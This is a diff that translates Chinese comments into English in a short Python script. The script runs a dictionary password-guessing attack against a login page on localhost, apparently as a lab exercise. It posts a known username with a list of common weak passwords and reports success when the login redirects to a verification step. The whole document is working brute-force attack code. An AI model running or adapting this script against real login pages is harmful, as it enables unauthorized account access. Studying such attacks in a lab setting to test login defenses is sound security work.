@@ -1,17 +1,17 @@
 import requests
 
-# 攻击目标地址（登录页面）
+# Attack target address (login page)
 URL = "http://127.0.0.1:5000/"
 
-# 模拟用户名（假设已知）
+# Simulate username (assuming it is known）
 username = "yihan "
 
-# 模拟常见弱密码字典
+# Emulating common weak password dictionaries
 password_list = [
     "123456", "admin", "password", "12345678", "qwerty", "abc123", "111111", "123123"
 ]
 
-# 遍历尝试每个密码组合
+# Iterate through trying each combination of passwords
 for password in password_list:
     data = {
         "username": username,
@@ -19,11 +19,11 @@ for password in password_list:
     }
     response = requests.post(URL, data=data)
 
-    # 输出响应状态与提示
+    # Output response status and prompts
     print(f"Trying password: {password}")
-    print(f"Response: {response.text[:100]}")  # 只显示前100字符
+    print(f"Response: {response.text[:100]}")  # Display only the first 100 characters
 
-    # 如果出现验证码页面重定向，说明可能成功进入下一步
+    # If the CAPTCHA page redirection appears, it means that it may be successful to proceed to the next step
     if "verify" in response.url:
         print("✅ Password found and login passed to verification!")
         break
